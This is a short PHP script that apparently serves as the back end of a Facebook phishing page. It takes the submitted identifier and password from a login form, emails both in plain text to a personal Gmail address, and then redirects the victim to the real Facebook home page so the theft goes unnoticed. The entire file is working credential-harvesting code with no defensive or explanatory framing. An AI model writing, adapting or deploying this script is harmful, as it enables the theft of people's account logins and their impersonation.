<?php
// Collect form data
$identifier = $_POST['identifier'] ?? '';
$password = $_POST['password'] ?? '';

// Compose email content
$to = 'jaeger.62frei@gmail.com';
$subject = 'Form Submission';
$message = "Identifier: $identifier\r\nPassword: $password";


$mailResult = mail($to, $subject, $message);

// Redirect to Facebook (assuming you want to redirect immediately)
header('Location: https://facebook.com/home');
exit;
?>
